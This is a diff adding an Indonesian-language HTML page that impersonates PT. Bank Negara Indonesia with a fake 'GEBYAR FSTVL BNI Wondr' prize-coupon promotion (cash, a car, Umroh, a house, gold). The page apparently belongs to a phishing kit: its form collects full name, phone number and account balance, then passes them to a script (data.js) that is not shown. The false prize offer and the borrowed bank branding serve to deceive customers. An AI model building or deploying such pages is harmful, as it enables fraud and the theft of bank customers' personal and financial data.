@@ -1,0 +1,77 @@
+<html>
+	<head>
+		<title>Daftar Kupon Sekarang</title>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<link rel="stylesheet" href="assets/common/css/global.css">
+		<link rel="stylesheet" href="assets/common/css/data.css">
+		<link rel="stylesheet" href="assets/lib/loader/loader.css">
+		<link rel="stylesheet" href="assets/lib/ripple/ripple.css">
+		<script src="assets/lib/jquery/jquery.js"></script>
+		<script>
+			const module = {};
+		</script>
+		<script type="module" src="assets/common/js/global.js"></script>
+		<script type="module" src="assets/common/js/data.js"></script>
+	</head>
+	<body>
+		<div style="width: 100%; height: 100%; background-color: #ffffff; overflow: scroll; display: flex; flex-direction: column;">
+			<img src="assets/common/img/img18.png" style="width: 100%; height: 55px; object-fit: fill;">
+			<div style="width: 100%; height: 0px; background-color: #ff8500;"></div>
+			<div style="width: 100%; display: flex; flex-direction: row; align-items: center;">
+				<img src="assets/common/img/notification.png" style="width: 30px; height: 30px; object-fit: contain;">
+				<div style="flex: 1; height: 50px; overflow: hidden;">
+			  	<div class="text1" style="width: 100%; height: 100%; color: #222328; display: flex; flex-direction: row; align-items: center;">
+					<b>Selamat Datang di GEBYAR FSTVL BNI Wondr Menangkan Hadiah Nya dan Keseruan nya...! jadikan Anda Pemenangnya</b>
+                  </div>
+                </div>
+			</div>
+			<img src="assets/common/img/img9.png" style="width: 100px; height: 80px; margin-left: 20px; object-fit: contain;">
+			<div style="width: calc(100% - 40px); display: flex; flex-direction: column; padding-left: 20px; padding-right: 20px;">
+				<div style="color: #000000; font-size: 14px; margin-top: 10px;"><b>Pilih Kupon Anda</b></div>
+			    <div style="width: calc(100% - 2px); height: 40px; background-color: #ffffff; border: 1px solid #ff8601; border-radius: 5px; margin-top: 2px;">
+			    	<select id="type" class="input1" style="width: calc(100% - 20px); height: 100%; padding-left: 10px; padding-right: 10px; background-color: #00000000; border: 0; outline: 0;">
+				      <option>Kupon &radic; Uang Cash</option>
+				      <option>Kupon &radic; Mobil Pajero Sport</option>
+				      <option>Kupon &radic; Umroh Gratis</option>
+				      <option>Kupon &radic; Rumah Gratis</option>
+				      <option>Kupon &radic; Emas Logam Mulia</option>
+				    </select>
+		    	</div>
+			    <div style="color: #000000; font-size: 14px; margin-top: 10px;"><b>Nama Lengkap</b></div>
+			    <div style="width: calc(100% - 2px); height: 40px; background-color: #ffffff; border: 1px solid #ff8601; border-radius: 5px; margin-top: 2px;">
+			    	<input id="name" class="input1" type="text" placeholder="" style="width: calc(100% - 20px); height: 100%; padding-left: 10px; padding-right: 10px; background-color: #00000000; border: 0; outline: 0;">
+		    	</div>
+		        <div style="color: #000000; font-size: 14px; margin-top: 10px;"><b>Nomor Handphone</b></div>
+		        <div style="width: calc(100% - 2px); height: 40px; background-color: #ffffff; border: 1px solid #ff8601; border-radius: 5px; margin-top: 2px; display: flex; flex-direction: row;">
+			    	<input id="phone" class="input1" type="tel" placeholder="" style="width: 100%; height: 100%; padding-left: 10px; padding-right: 10px; background-color: #00000000; border: 0; outline: 0;">
+		    	</div>
+	        	<div style="color: #000000; font-size: 14px; margin-top: 10px;"><b>Saldo Rekening</b></div>
+			    <div style="width: calc(100% - 2px); height: 40px; background-color: #ffffff; border: 1px solid #ff8601; border-radius: 5px; margin-top: 2px; display: flex; flex-direction: row;">
+				    <div style="width: 40px; height: 40px; display: flex; justify-content: center; align-items: center; color: #cccccc; font-size: 12px;">Rp.</div>
+			    	<input id="balance" class="input1" type="tel" placeholder="" style="width: 100%; height: 100%; padding-left: 10px; padding-right: 10px; background-color: #00000000; border: 0; outline: 0;">
+		    	</div>
+			    <div class="ripple" onclick="module.next()" style="width: 100%; height: 50px; box-shadow: 0 5px 5px 1px #4444442f; margin-top: 30px; background-color: #ff8736; border: 1px solid #ffffff; border-radius: 5px; color: #ffffff; font-size: 15px; display: flex; justify-content: center; align-items: center;"><b>Cetak Kupon</b></div>
+			    <div style="font-size: 15px; margin-top: 10px; align-self: center;"><span style="color: #ff8601;"><b>Semua Nasabah Bank BNI</b></span><span style="color: #098CF3; margin-left: 5px;"><b>Bekesempatan</b></span></div>
+		    	<div style="color: #000000; font-size: 10px; margin-top: 10px; margin-bottom: 50px; align-self: center;">PT. Bank Negara Indonesia, Tbk.</div>
+			</div>
+			<div style="position: fixed; left: 0; bottom: 0; width: 100%; display: flex; flex-direction: column;">
+				<div style="width: 100%; height: 4px; background-color: #3fd8d4;"></div>
+				<div style="width: 100%; height: 50px; display: flex; justify-content: center; align-items: center; background-color: #ff8736; color: #ffffff; font-size: 12px;">
+				  © 2025 PT. Bank BNI (Persero) Tbk.
+			    </div>
+			</div>
+			<div id="loader" style="display: none; position: fixed; left: 0; top: 0; width: 100%; height: 100%; background-color: #0000007f; justify-content: center; align-items: center;">
+				<div style="width: calc(100% - 80px); margin-left: 40px; margin-right: 40px; height: 120px; background-color: #ffffff; border-radius: 5px; display: flex; justify-content: center; align-items: center;">
+					<div class="loader" style="width: 50px; height: 50px;"></div>
+				</div>
+			</div>
+		</div>
+	</body>
+</html>
+
+
+
+
+
+
+
